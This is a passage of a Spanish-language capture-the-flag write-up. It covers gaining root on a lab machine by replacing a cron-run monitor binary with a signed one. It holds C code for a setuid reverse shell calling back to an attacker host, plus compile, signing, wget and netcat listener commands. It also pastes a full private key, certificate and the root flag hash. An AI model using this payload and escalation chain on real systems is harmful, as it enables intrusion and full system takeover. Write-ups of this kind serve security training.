2025/09/25 12:24:01 CMD: UID=0     PID=26726  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/09/25 12:24:01 CMD: UID=0     PID=26725  | /usr/sbin/CRON -f -P 
2025/09/25 12:24:01 CMD: UID=0     PID=26724  | /usr/sbin/CRON -f -P 
2025/09/25 12:24:01 CMD: UID=0     PID=26728  | /bin/bash /root/initiate_monitoring.sh 
2025/09/25 12:24:01 CMD: UID=0     PID=26731  | /bin/bash /root/initiate_monitoring.sh 
2025/09/25 12:24:01 CMD: UID=0     PID=26730  | /bin/sh -c bash -c 'echo > /opt/AV/periodic-checks/status.log' 
2025/09/25 12:24:01 CMD: UID=0     PID=26729  | /bin/bash /root/initiate_monitoring.sh
```

Por lo que vemos esta comprobando la firma del binario y como no es igual no lo ejecuta, acordemonos de que obtuvimos un archivo en el comprimido de `signing.zip` que nos daba ya estas claves, por lo que vamos a crear un binario desde `C#` compilarlo y firmarlo con dichas claves de esta forma desde nuestra maquina atacante:

Primero vamos a crear el `monitor.c`:

```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1", NULL);
    return 0;
}
```

Ahora vamos a compilarlo:

```shell
x86_64-linux-gnu-gcc -o monitor monitor.c -static
```

> key.pem

```
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCqKH30+RZjkxiV
JMnuB6b1dDbWUaw3p2QyQvWMbFvsi7zG1kE2LBrKjsEyvcxo8m0wL9feuFiOlciD
MamELMAW0UjMyew01+S+bAEcOawH81bVahxNkA4hHi9d/rysTe/dnNkh08KgHhzF
mTApjbV0MQwUDOLXSw9eHd+1VJClwhwAsL4xdk4pQS6dAuJEnx3IzNoQ23f+dPqT
CMAAWST67VPZjSjwW1/HHNi12ePewEJRGB+2K+YeGj+lxShW/I1jYEHnsOrliM2h
ZvOLqS9LjhqfI9+Q1RxIQF69yAEUeN4lYupa0Ghr2h96YLRE5YyXaBxdSA4gLGOV
HZgMl2i/AgMBAAECggEALCO53NjamnT3bQTwjtsUT9rYOMtR8dPt1W3yNX2McPWk
wC2nF+7j+kSC0G9UvaqZcWUPyfonGsG3FHVHBH75S1H54QnGSMTyVQU+WnyJaDyS
+2R9uA8U4zlpzye7+LR08xdzaed9Nrzo+Mcuq7DTb7Mjb3YSSAf0EhWMyQSJSz38
nKOcQBQhwdmiZMnVQp7X4XE73+2Wft9NSeedzCpYRZHrI820O+4MeQrumfVijbL2
xx3o0pnvEnXiqbxJjYQS8gjSUAFCc5A0fHMGmVpvL+u7Sv40mj/rnGvDEAnaNf+j
SlC9KdF5z9gWAPii7JQtTzWzxDinUxNUhlJ00df29QKBgQDsAkzNjHAHNKVexJ4q
4CREawOfdB/Pe0lm3dNf5UlEbgNWVKExgN/dEhTLVYgpVXJiZJhKPGMhSnhZ/0oW
gSAvYcpPsuvZ/WN7lseTsH6jbRyVgd8mCF4JiCw3gusoBfCtp9spy8Vjs0mcWHRW
PRY8QbMG/SUCnUS0KuT1ikiIYwKBgQC4kkKlyVy2+Z3/zMPTCla/IV6/EiLidSdn
RHfDx8l67Dc03thgAaKFUYMVpwia3/UXQS9TPj9Ay+DDkkXsnx8m1pMxV0wtkrec
pVrSB9QvmdLYuuonmG8nlgHs4bfl/JO/+Y7lz/Um1qM7aoZyPFEeZTeh6qM2s+7K
kBnSvng29QKBgQCszhpSPswgWonjU+/D0Q59EiY68JoCH3FlYnLMumPlOPA0nA7S
4lwH0J9tKpliOnBgXuurH4At9gsdSnGC/NUGHII3zPgoSwI2kfZby1VOcCwHxGoR
vPqt3AkUNEXerkrFvCwa9Fr5X2M8mP/FzUCkqi5dpakduu19RhMTPkdRpQKBgQCJ
tU6WpUtQlaNF1IASuHcKeZpYUu7GKYSxrsrwvuJbnVx/TPkBgJbCg5ObFxn7e7dA
l3j40cudy7+yCzOynPJAJv6BZNHIetwVuuWtKPwuW8WNwL+ttTTRw0FCfRKZPL78
D/WHD4aoaKI3VX5kQw5+8CP24brOuKckaSlrLINC9QKBgDs90fIyrlg6YGB4r6Ey
4vXtVImpvnjfcNvAmgDwuY/zzLZv8Y5DJWTe8uxpiPcopa1oC6V7BzvIls+CC7VC
hc7aWcAJeTlk3hBHj7tpcfwNwk1zgcr1vuytFw64x2nq5odIS+80ThZTcGedTuj1
qKTzxN/SefLdu9+8MXlVZBWj
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIUbWNKqYHhk6HkSMUgX/ebhOa29QswDQYJKoZIhvcNAQEL
BQAwTzERMA8GA1UECgwIRXJhIEluYy4xGTAXBgNVBAMMEEVMRiB2ZXJpZmljYXRp
b24xHzAdBgkqhkiG9w0BCQEWEHl1cml2aWNoQGVyYS5jb20wIBcNMjUwMTI2MDIw
OTM1WhgPMjEyNTAxMDIwMjA5MzVaME8xETAPBgNVBAoMCEVyYSBJbmMuMRkwFwYD
VQQDDBBFTEYgdmVyaWZpY2F0aW9uMR8wHQYJKoZIhvcNAQkBFhB5dXJpdmljaEBl
cmEuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqih99PkWY5MY
lSTJ7gem9XQ21lGsN6dkMkL1jGxb7Iu8xtZBNiwayo7BMr3MaPJtMC/X3rhYjpXI
gzGphCzAFtFIzMnsNNfkvmwBHDmsB/NW1WocTZAOIR4vXf68rE3v3ZzZIdPCoB4c
xZkwKY21dDEMFAzi10sPXh3ftVSQpcIcALC+MXZOKUEunQLiRJ8dyMzaENt3/nT6
kwjAAFkk+u1T2Y0o8FtfxxzYtdnj3sBCURgftivmHho/pcUoVvyNY2BB57Dq5YjN
oWbzi6kvS44anyPfkNUcSEBevcgBFHjeJWLqWtBoa9ofemC0ROWMl2gcXUgOICxj
lR2YDJdovwIDAQABozwwOjAMBgNVHRMBAf8EAjAAMAsGA1UdDwQEAwIHgDAdBgNV
HQ4EFgQU/XYF/LzWBMr+NhZw/PHUlQHb0s0wDQYJKoZIhvcNAQELBQADggEBAAzE
eNQxIJH6Z8vOvP8g1OoyD0Ot9E8U/PdxlM7QWqk9qcH0xyQZqg7Ee5L/kq4y/1i1
ZxAPlBfOUx4KhZgWVkStfvut0Ilg3VSXVntPPRi8WAcDV5nivYtphv16ZQkaclFy
dN0mYQc2NlqDv+y5FKnGbkioRUVGGmkIqeaT4HIUA2CFRnTr2Jao0TwAIG0jfpov
+y/t2WhUNto9L04vcD3ZAzuEPZnqs/L9rsoDZ1Ee3DxnOC7l3PkklaIiDrXiHAkd
Nrg7N9XCeQr0FUS0xLMBMVCEJT2TCo6lXKtcI5A5FgAcyECDzkw+HdgSYFPaoYJq
5rxH+xhuDqRDr941Sg4=
-----END CERTIFICATE-----
```

Vamos a firmar el binario con estos pasos de los archivos que hayamos creado necesarios:

```shell
git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git # Descargar una herramienta especializada para firmar binarios ELF
sudo apt install libssl-dev # Instalamos dependencias
cd linux-elf-binary-signer/ # Nos movemos al directorio
gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations # compilar el programa firmador de binarios
# Nos copiamos nuestro key.pem al directorio actual junto con el monitor compilado
./elf-sign sha256 key.pem key.pem monitor # firmar el binario `monitor` usando el algoritmo SHA256 y el certificado/key
```

Info:

```
--- 64-bit ELF file, version 1 (CURRENT), little endian.
 --- 26 sections detected.
 --- Section 0006 [.text] detected.
 --- Length of section [.text]: 480313
 --- Signature size of [.text]: 458
 --- Writing signature to file: .text_sig
 --- Removing temporary signature file: .text_sig
```

Ahora vamos a abrir un servidor de `python3` para pasarnos el archivo.

```shell
python3 -m http.server 80
```

Seguidamente estaremos a la escucha desde otra pestaña de terminal:

```shell
nc -lvnp <PORT>
```

Desde la maquina victima, vamos a ejecutar lo siguiente:

```shell
cd /tmp
wget http://<IP_ATTACKER>/monitor
chmod +x monitor
rm /opt/AV/periodic-checks/monitor
mv monitor /opt/AV/periodic-checks/
```

Si esperamos un poco y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.79] 57240
bash: cannot set terminal process group (101416): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# whoami
whoami
root
```

Veremos que ha funcionado, con esto ya seremos `root`, por lo que vamos a leer la `flag` de `root`.

> root.txt

```
be7d13252b4df650acbec1c6e7193ffa
```
